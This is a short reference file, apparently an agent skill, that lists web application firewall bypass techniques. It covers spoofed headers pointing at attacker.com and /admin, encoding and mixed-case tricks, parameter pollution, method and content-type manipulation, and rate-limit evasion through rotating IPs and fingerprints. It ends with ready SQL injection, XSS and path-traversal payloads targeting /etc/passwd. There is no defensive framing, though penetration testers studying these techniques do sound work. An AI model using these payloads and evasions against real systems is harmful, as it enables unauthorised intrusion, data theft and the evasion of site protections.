---
name: waf-bypass-techniques
description: WAF bypass techniques via header manipulation, encoding, HTTP parameter pollution, and HTTP method smuggling
category: vulnerabilities
---

# WAF Bypass Techniques

## Header-Based Bypass
```
X-Forwarded-Host: attacker.com
X-Forwarded-Port: 443
X-Forwarded-Scheme: https
Origin: null
X-Original-URL: /admin
X-Rewrite-URL: /admin
X-Custom-IP-Authorization: 127.0.0.1
X-Originating-IP: 127.0.0.1
```

## Encoding Bypass
- URL encoding: `%27` = `'`, `%3C` = `<`
- Double URL encoding: `%253C` = `%3C` = `<`
- Unicode encoding: `\u003c` = `<`, `\x3c` = `<`
- Base64 encoding of payload
- HTML entity encoding: `&#60;` = `<`
- Mixed case: `SeLeCt * FrOm`

## HTTP Parameter Pollution
- Add multiple parameters: `?id=1&id=2` → backend may use different one
- Use array notation: `?id[]=1&id[]=2`
- Parameter name case variations: `?ID=1`, `?Id=1`

## HTTP Method Smuggling
- Use unexpected methods: POST with `Content-Type: multipart/form-data` for SQLi
- TRACE method to see transformed requests
- OPTIONS to discover allowed methods
- PATCH instead of POST for injection payloads

## Content-Type Manipulation
- Change `application/json` → `application/x-www-form-urlencoded`
- Use `multipart/form-data` with boundary manipulation
- Add charset: `application/json;charset=utf-16` (bypasses pattern matching)
- Use `text/plain` instead of `text/html`

## Rate Limiting Evasion
- Rotate User-Agent
- Add junk cookies
- Change TLS fingerprint (different library/device)
- Slow down request rate
- Use different IP addresses

## Common WAF Evasion Payloads
- SQLi: `1' OR '1'='1' --`, `1' UN/**/ION SEL/**/ECT`
- XSS: `<svg onload=alert(1)>`, `<img src=x:alert(alt) onerror=eval(src)>`
- Path traversal: `....//....//etc/passwd`, `..%252f..%252f`
